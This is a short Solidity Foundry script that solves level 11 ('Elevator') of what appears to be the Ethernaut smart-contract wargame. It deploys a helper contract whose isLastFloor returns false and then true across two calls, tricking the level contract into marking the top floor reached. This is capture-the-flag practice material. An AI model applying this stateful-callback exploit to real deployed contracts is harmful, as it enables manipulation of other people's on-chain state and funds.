// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/11-Elevator/Elevator.sol";

contract ExploitScript is Script {
    BrokenElevator BrokenElevatorContract;
    Elevator level11 = Elevator(payable(0x1D2C7438f297227e57b1FdBA9b92A67725DceC8e));


    function run() public {
        vm.startBroadcast();
        BrokenElevatorContract = new BrokenElevator();
        BrokenElevatorContract.gotoFloor();

        vm.stopBroadcast();
    }

}

contract BrokenElevator {

    Elevator level11 = Elevator(0x1D2C7438f297227e57b1FdBA9b92A67725DceC8e);
    bool public counter = false; // counter variable initially set to false

    function gotoFloor() public {
        level11.goTo(1);
    }

    function isLastFloor(uint _floor) public returns (bool) {
        if (!counter) { // if (true)
            counter = true; // change the counter to true
            return false; // first return value will be false
        } else {
            counter = false; // change the counter to false
            return true; // second return value will be true
        }
    }
}